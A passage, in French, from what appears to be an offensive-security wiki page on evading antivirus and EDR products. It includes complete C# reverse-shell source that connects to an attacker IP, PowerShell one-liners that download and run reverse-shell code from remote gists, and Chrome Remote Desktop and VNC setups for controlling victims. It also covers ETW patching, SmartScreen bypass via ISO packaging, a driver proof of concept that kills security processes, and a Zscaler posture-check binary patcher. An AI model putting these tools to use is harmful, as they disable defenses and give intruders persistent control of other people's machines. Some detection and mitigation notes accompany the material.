- [**obfy**](https://github.com/fritzone/obfy) : ajoute une couche d’opérations obfusquées générées par le framework de métaprogrammation par templates C++ afin de compliquer un peu la tâche de la personne qui souhaite cracker l’application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)** :** Alcatraz est un obfuscateur de binaires x64 capable d’obfusquer différents fichiers PE, notamment .exe, .dll et .sys.
- [**metame**](https://github.com/a0rtega/metame) : Metame est un moteur de code métamorphique simple pour des exécutables quelconques.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator) : ROPfuscator est un framework d’obfuscation de code à grain fin pour les langages pris en charge par LLVM, utilisant ROP (programmation orientée retour). ROPfuscator obfusque un programme au niveau du code assembleur en transformant les instructions classiques en chaînes ROP, contrecarrant ainsi notre conception naturelle du flux de contrôle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt) : Nimcrypt est un crypter PE .NET écrit en Nim.
- [**inceptor**](https://github.com/klezVirus/inceptor)** :** Inceptor peut convertir des EXE/DLL existants en shellcode, puis les charger.

### Masquage individuel de fonctions assisté par le compilateur LLVM

Au lieu de masquer un implant entier uniquement pendant son inactivité, un backend LLVM X86 modifié peut conserver certaines fonctions masquées par XOR lorsqu’elles sont inactives. Le PoC Function Peekaboo sélectionne les noms démanglés contenant `REG_`, injecte des stubs d’entrée/sortie indépendants de la position autour du code machine final, et émet un gestionnaire de masquage partagé dans `.text` ; les signatures au niveau source et la convention d’appel Windows x64 restent inchangées.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformation du flux de contrôle du backend

Cette étape doit avoir lieu après la sélection des instructions et l’optimisation, car la transformation doit couvrir **chaque retour émis** et connaître la disposition exacte du code x86. Un `MachineFunctionPass` pré-émission repère le dernier `MachineInstr::isReturn()`, le supprime afin que le chemin final tombe dans l’épilogue ajouté, et remplace les retours précédents par `JMP_1 handler`. Conservez toute restauration de pile/trame générée par le compilateur avant chaque retour ; redirigez uniquement l’instruction de retour elle-même.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` et `emitFunctionBodyEnd()` émettent les stubs propres à chaque fonction, tandis que `emitEndOfAsmFile()` émet le gestionnaire. Les symboles partagés entre les étapes d’émission permettent à un branchement du prologue de cibler son épilogue ultérieur ; pour un `je` near émis manuellement, écrivez `0F 84`, suivi de l’expression MC de quatre octets `target - address_after_je`. Les appels et sauts vers le gestionnaire peuvent plutôt être émis sous forme d’objets `MCInst` (`CALL64pcrel32` et `JMP_1`). Un pass doit renvoyer `false` pour une fonction non sélectionnée lorsqu’il n’a rien modifié ; le PoC renvoie incorrectement `true` dans ce cas.<sup>[[38]](#references)[[39]](#references)</sup>

#### Métadonnées et initialisation pré-CRT

Le PoC place une clé XOR et des enregistrements de 16 octets contenant un pointeur de fonction relocalisé par le loader ainsi qu’une longueur à l’exécution dans `.funcmeta`. Bien que le champ C soit un `uint32_t`, le gestionnaire accède à un QWORD à l’offset `+8` de l’enregistrement, consommant la longueur et son padding, puis avance de `0x10` entre les enregistrements. Les noms de sections PE ne font que huit octets ; la recherche à l’exécution voit donc `.funcmet`. Un patcher externe ajoute un `.stub` exécutable, enregistre l’ancien RVA du point d’entrée dans le stub et redirige `AddressOfEntryPoint` ; le stub PIC obtient la base de l’image depuis `gs:[0x60]` → `[PEB+0x10]`, parcourt les imports PE32+ pour résoudre un `VirtualProtect` déjà importé, et s’exécute avant le CRT.<sup>[[38]](#references)[[39]](#references)</sup>

L’initialisation définit un sentinelle dans `gs:[0xE8]` et appelle chaque fonction référencée dans les métadonnées. Son prologue, toujours lisible, enregistre le début de la fonction dans `gs:[0xF0]`, détecte le sentinelle et ignore le corps encore non masqué. L’épilogue utilise ensuite `call handler` ; après que le gestionnaire a sauvegardé 13 registres (`0x68` octets), l’adresse de retour à `[rsp+0x68]` correspond à la fin de la fonction transformée, ce qui permet d’écrire `end - start` dans son enregistrement de métadonnées. Le stub efface le sentinelle et saute à `ImageBase + original_entry_point_RVA` après avoir masqué tous les corps.<sup>[[38]](#references)[[39]](#references)</sup>

Lors d’un appel normal, le prologue appelle le même gestionnaire symétrique pour décoder le corps. Le chemin final tombe dans l’épilogue ajouté, tandis que chaque retour précédent saute directement vers le gestionnaire partagé. L’épilogue normal utilise également `jmp handler` plutôt que `call` ; après le remasquage, le `ret` du gestionnaire consomme l’adresse de retour de l’appelant d’origine et préserve le résultat de la fonction dans `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive de masquage et indicateurs d’analyse

Le gestionnaire trouve l’enregistrement courant, ignore le prologue visible de longueur fixe (`0x46` octets dans cette compilation), passe le reste en `PAGE_EXECUTE_READWRITE`, applique un XOR octet par octet avec l’octet de poids faible de la clé, puis le repasse en `PAGE_EXECUTE_READ`. La même boucle décode donc le corps à l’entrée et l’encode à chaque sortie normale.<sup>[[38]](#references)[[39]](#references)</sup>

Les indicateurs à forte valeur pour cette conception comprennent :<sup>[[38]](#references)[[39]](#references)</sup>

- un point d’entrée situé dans un `.stub` exécutable et une section `.funcmet` contenant une clé ainsi que des pointeurs relocalisés vers `.text` ;
- l’analyse du PEB, de la table d’importation et de la table des sections avant le CRT, suivie d’appels via chaque pointeur des métadonnées ;
- des prologues PIC `call`/`pop` identiques et de nombreux sites de retour redirigés vers un gestionnaire unique ;
- des écritures dans `gs:[0xE8]`, `gs:[0xF0]` et `gs:[0xF8]`, suivies de transitions répétées par `VirtualProtect` et d’écritures XOR octet par octet dans des pages exécutables adossées à l’image.

Il s’agit d’une évasion des scanners mémoire, et non d’une protection cryptographique : le fichier patché contient toujours le corps d’origine en clair, et un debugger peut s’arrêter sur `VirtualProtect` ou la boucle XOR pour dumper la fonction active. Le XOR sur un seul octet, les métadonnées lisibles et la limite fixe `0x46` rendent également la récupération hors ligne simple.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Les emplacements TEB du PoC sont propres à chaque thread, mais les pages de code modifiées sont partagées par tout le processus. Des entrées concurrentes ou récursives peuvent donc inverser de nouveau les instructions pendant qu’une autre invocation les exécute ; les exceptions et les sorties non locales peuvent également contourner le remasquage. Une implémentation robuste doit synchroniser les transitions, restaurer la protection réellement renvoyée via `lpflOldProtect`, éviter les longueurs de stub codées en dur, vérifier l’alignement de pile x64 pour les chemins `call` et `jmp`, et appeler `FlushInstructionCache` après la réécriture d’octets exécutables. Microsoft indique explicitement qu’il incombe à l’appelant d’assurer la cohérence du cache d’instructions lorsque le code exécutable est modifié.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Vous avez peut-être déjà vu cet écran en téléchargeant des exécutables depuis Internet et en les exécutant.

Microsoft Defender SmartScreen est un mécanisme de sécurité conçu pour empêcher l’utilisateur final d’exécuter des applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen repose principalement sur une approche fondée sur la réputation : les applications rarement téléchargées déclenchent donc SmartScreen, qui avertit l’utilisateur final et l’empêche d’exécuter le fichier (celui-ci peut toutefois être exécuté en cliquant sur Plus d’informations -> Exécuter quand même).

**MoTW** (Mark of The Web) est un [flux de données alternatif NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) nommé Zone.Identifier, créé automatiquement lors du téléchargement de fichiers depuis Internet, avec l’URL d’origine.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification du flux ADS Zone.Identifier d’un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un certificat de signature **de confiance** **ne déclenchent pas SmartScreen**.

Un moyen très efficace d’empêcher vos payloads de recevoir le Mark of The Web consiste à les empaqueter dans un conteneur tel qu’un ISO. En effet, le Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui empaquette des payloads dans des conteneurs de sortie afin d’échapper au Mark-of-the-Web.

Exemple d’utilisation :

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Voici une démonstration du contournement de SmartScreen en empaquetant des payloads dans des fichiers ISO avec [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un puissant mécanisme de journalisation de Windows qui permet aux applications et aux composants système de **consigner des événements**. Cependant, les produits de sécurité peuvent également l'utiliser pour surveiller et détecter les activités malveillantes.

Comme pour la désactivation (le contournement) d'AMSI, il est également possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans consigner d'événements. Pour ce faire, on patche la fonction en mémoire afin qu'elle retourne immédiatement, désactivant ainsi la journalisation ETW pour ce processus.

Vous trouverez plus d'informations dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) et [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Le chargement de binaires C# en mémoire est connu depuis un certain temps et reste un excellent moyen d'exécuter vos outils de post-exploitation sans être détecté par l'AV.

Puisque le payload sera chargé directement en mémoire sans toucher au disque, il suffira de patcher AMSI pour l'ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) permettent déjà d'exécuter des assemblies C# directement en mémoire, mais il existe différentes façons de procéder :

- **Fork\&Run**

Cette méthode consiste à **lancer un nouveau processus sacrifiable**, à injecter votre code malveillant de post-exploitation dans ce processus, à exécuter votre code malveillant, puis à tuer le nouveau processus une fois l'exécution terminée. Cette méthode a des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution a lieu **en dehors** du processus de notre implant Beacon. Ainsi, si une opération de post-exploitation échoue ou est détectée, les chances que notre **implant survive** sont **bien plus élevées**. L'inconvénient est que les **détections comportementales** ont **davantage de chances** de vous repérer.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Cette méthode consiste à injecter le code malveillant de post-exploitation **dans son propre processus**. Vous évitez ainsi d'avoir à créer un nouveau processus et à le faire analyser par l'AV, mais si l'exécution de votre payload échoue, vous risquez **bien davantage de perdre votre beacon**, qui pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Pour en savoir plus sur le chargement d'assemblies C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ainsi que leur BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez également charger des assemblies C# **depuis PowerShell**. Consultez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et [la vidéo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Utiliser d'autres langages de programmation

Comme le propose [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant dans d'autres langages en donnant à la machine compromise accès **à l'environnement de l'interpréteur installé sur le partage SMB contrôlé par l'attaquant**.

En donnant accès aux binaires de l'interpréteur et à son environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** sur la machine compromise.

Le dépôt indique que Defender analyse toujours les scripts, mais qu'en utilisant Go, Java, PHP, etc., on dispose d'**une plus grande flexibilité pour contourner les signatures statiques**. Des tests avec des scripts reverse shell aléatoires et non obfusqués dans ces langages ont donné de bons résultats.

## TokenStomping

Token stomping manipule le jeton d'accès d'un produit de sécurité tel qu'un EDR ou un AV. La réduction des privilèges du jeton peut laisser le processus actif tout en l'empêchant d'effectuer des actions d'inspection ou de remédiation privilégiées.

Pour éviter cela, Windows pourrait **empêcher les processus externes** d'obtenir des handles sur les jetons des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Utiliser des logiciels de confiance

### Chrome Remote Desktop

Comme décrit dans [**cet article de blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur le PC d'une victime, puis de l'utiliser pour en prendre le contrôle et maintenir la persistance :<sup>[[35]](#references)</sup>
1. Téléchargez le logiciel depuis https://remotedesktop.google.com/, cliquez sur « Set up via SSH », puis sur le fichier MSI pour Windows afin de le télécharger.
2. Exécutez silencieusement le programme d'installation sur la machine de la victime (droits d'administrateur requis) : `msiexec /i chromeremotedesktophost.msi /qn`
3. Retournez sur la page Chrome Remote Desktop et cliquez sur « Next ». L'assistant vous demandera alors d'autoriser l'opération ; cliquez sur le bouton « Authorize » pour continuer.
4. Exécutez la commande fournie en effectuant les ajustements nécessaires : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (le paramètre `--pin` définit le PIN sans utiliser l'interface graphique).
 

## Évasion avancée

L'évasion est un sujet très complexe. Il faut parfois tenir compte de nombreuses sources de télémétrie au sein d'un même système ; il est donc pratiquement impossible de passer complètement inaperçu dans des environnements matures.

Chaque environnement que vous ciblez a ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette présentation de [@ATTL4S](https://twitter.com/DaniLJ94) pour découvrir les techniques d'évasion avancées.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Voici également une autre excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur l'évasion en profondeur.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Anciennes techniques**

### **Vérifier quelles parties Defender détecte comme malveillantes**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), qui **supprime des parties du binaire** jusqu'à **déterminer quelle partie Defender** considère comme malveillante, puis vous l'isole.\
Un autre outil qui fait **la même chose est** [**avred**](https://github.com/dobin/avred), qui propose le service sur le Web à l'adresse [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serveur Telnet**

Jusqu'à Windows10, toutes les versions de Windows étaient fournies avec un **serveur Telnet** que vous pouviez installer (en tant qu'administrateur) avec la commande suivante :

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Faites-le **démarrer** au démarrage du système et **exécutez-le** maintenant :

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Changer le port telnet** (stealth) et désactiver le pare-feu :

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les téléchargements bin, pas l’installeur)

**SUR L’HÔTE** : Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l’option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier _**UltraVNC.ini**_ nouvellement créé dans la **victime**

#### **Connexion inversée**

L’**attaquant** doit **exécuter sur** son **hôte** le binaire `vncviewer.exe -listen 5900` afin qu’il soit **prêt** à recevoir une **connexion VNC** inversée. Ensuite, sur la **victime** : démarrez le démon winvnc `winvnc.exe -run` et exécutez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENTION :** Pour rester furtif, évitez les actions suivantes :

- Ne démarrez pas `winvnc` s’il est déjà en cours d’exécution, sinon vous déclencherez une [fenêtre contextuelle](https://i.imgur.com/1SROTTl.png). Vérifiez s’il est en cours d’exécution avec `tasklist | findstr winvnc`
- Ne démarrez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire, sinon la [fenêtre de configuration](https://i.imgur.com/rfMQWcf.png) s’ouvrira
- N’exécutez pas `winvnc -h` pour obtenir de l’aide, sinon vous déclencherez une [fenêtre contextuelle](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Dans GreatSCT :

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Maintenant, **démarrez le lister** avec `msfconsole -r file.rc` et **exécutez le payload xml** avec :

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Le Defender actuel terminera le processus très rapidement.**

### Compilation de notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier reverse shell C#

Compilez-le avec :

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Utilisez-le avec :

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# avec le compilateur

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d’obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemple d’utilisation de Python pour créer des injecteurs :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Plus

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Apportez votre propre pilote vulnérable (BYOVD) – Éliminer les AV/EDR depuis l’espace noyau

Storm-2603 a utilisé un petit utilitaire console appelé **Antivirus Terminator** pour désactiver les protections des endpoints avant de déployer un ransomware. L’outil apporte son **propre pilote vulnérable mais *signé*** et l’exploite pour effectuer des opérations privilégiées dans le noyau que même les services AV protégés par Protected-Process-Light (PPL) ne peuvent pas bloquer.<sup>[[12]](#references)</sup>

Points clés
1. **Pilote signé** : le fichier déposé sur le disque est `ServiceMouse.sys`, mais le binaire est le pilote légitimement signé `AToolsKrnl64.sys` de la « System In-Depth Analysis Toolkit » d’Antiy Labs. Comme le pilote porte une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Installation du service** :
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   La première ligne enregistre le pilote comme **service du noyau** et la seconde le démarre, rendant ainsi `\\.\ServiceMouse` accessible depuis l’espace utilisateur.
3. **IOCTLs exposés par le pilote**
   | Code IOCTL | Capacité                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Terminer un processus arbitraire par PID (utilisé pour arrêter les services Defender/EDR) |
   | `0x990000D0` | Supprimer un fichier arbitraire du disque |
   | `0x990001D0` | Décharger le pilote et supprimer le service |

   Preuve de concept minimale en C :
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Pourquoi ça fonctionne** : BYOVD contourne entièrement les protections en mode utilisateur ; le code qui s’exécute dans le noyau peut ouvrir des processus *protégés*, les terminer ou altérer des objets du noyau, quels que soient PPL/PP, ELAM ou les autres fonctionnalités de renforcement de la sécurité.

Détection / mesures d’atténuation
•  Activez la liste de blocage des pilotes vulnérables de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.
•  Surveillez la création de nouveaux services du *noyau* et déclenchez une alerte lorsqu’un pilote est chargé depuis un répertoire accessible en écriture à tous ou absent de la liste d’autorisation.
•  Surveillez les handles en mode utilisateur vers des objets de périphérique personnalisés, suivis d’appels `DeviceIoControl` suspects.

### Contournement des vérifications de posture de Zscaler Client Connector par modification binaire sur disque

Le **Client Connector** de Zscaler applique localement des règles de posture de l’appareil et s’appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles permettent un contournement complet :

1. L’évaluation de la posture s’effectue **entièrement côté client** (un booléen est envoyé au serveur).
2. Les points de terminaison RPC internes vérifient uniquement que l’exécutable qui se connecte est **signé par Zscaler** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

La **modification de quatre binaires signés sur disque** permet de neutraliser ces deux mécanismes :

| Binaire | Logique d’origine modifiée | Résultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Renvoie toujours `1`, donc toutes les vérifications sont conformes |
| `ZSAService.exe` | Appel indirect à `WinVerifyTrust` | Remplacé par des NOP ⇒ tout processus (même non signé) peut se connecter aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacée par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Vérifications d’intégrité du tunnel | Court-circuitées |

Extrait minimal du patcher :

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Après avoir remplacé les fichiers d'origine et redémarré la pile de services :

* **Tous** les contrôles de posture affichent un état **vert/conforme**.
* Des binaires non signés ou modifiés peuvent ouvrir les points de terminaison RPC de type named pipe (par ex. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'hôte compromis obtient un accès sans restriction au réseau interne défini par les stratégies Zscaler.

Cette étude de cas montre comment des décisions de confiance prises uniquement côté client et de simples vérifications de signature peuvent être contournées avec quelques modifications d'octets.

## Abus des fonctionnalités de confiance du pilote Microsoft Defender `BTR.sys`

Le pilote **Boot-Time Removal** de Defender constitue un contre-exemple intéressant au BYOVD classique. `BTR.sys` est un composant de correction légitime signé par Microsoft, sans bug de corruption mémoire ni interface IOCTL ; après avoir obtenu un accès administrateur et `SeLoadDriverPrivilege`, un opérateur peut plutôt falsifier sa transaction privée de correction et obtenir les opérations prévues sur les fichiers et le registre en Ring-0. Il s'agit d'une **primitive de neutralisation d'AV/EDR après compromission, et non d'un vecteur d'accès initial ou d'escalade de privilèges** ; le pilote peut être extrait de la ressource `BOOTTIMETOOL` du `MpEngine.dll` de la cible elle-même, plutôt que d'importer un pilote tiers particulièrement visible.<sup>[[36]](#references)</sup>

### Préparation du pilote à usage unique

